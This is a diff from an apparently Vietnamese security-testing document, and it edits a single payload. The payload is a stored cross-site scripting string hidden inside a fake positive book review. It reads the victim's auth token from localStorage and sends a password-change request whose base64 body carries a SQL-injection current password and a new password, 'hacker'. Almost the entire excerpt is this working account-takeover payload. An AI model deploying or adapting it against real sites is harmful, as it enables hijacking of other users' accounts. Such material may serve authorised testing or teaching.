@@ -252,7 +252,7 @@ Kết quả mong đợi:
 HOẶC thêm vào payload ép người dùng đổi password:
 
 ```html
-Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror='var t=localStorage.getItem("auth_token");if(t){fetch("/api/profile/password",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+t},body:atob("eyJjdXJyZW50UGFzc3dvcmQiOiInIE9SICcxJz0nMSctLSIsIm5ld1Bhc3N3b3JkIjoiaGFja2VkX2NzcmYiLCJjb25maXJtUGFzc3dvcmQiOiJoYWNrZWRfY3NyZiJ9")})}'>
+Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror='var t=localStorage.getItem("auth_token");if(t){fetch("/api/profile/password",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+t},body:atob("eyJjdXJyZW50UGFzc3dvcmQiOiInIE9SICcxJz0nMSctLSIsIm5ld1Bhc3N3b3JkIjoiaGFja2VyIiwiY29uZmlybVBhc3N3b3JkIjoiaGFja2VyIn0=")})}'>
 ```
 
 ---
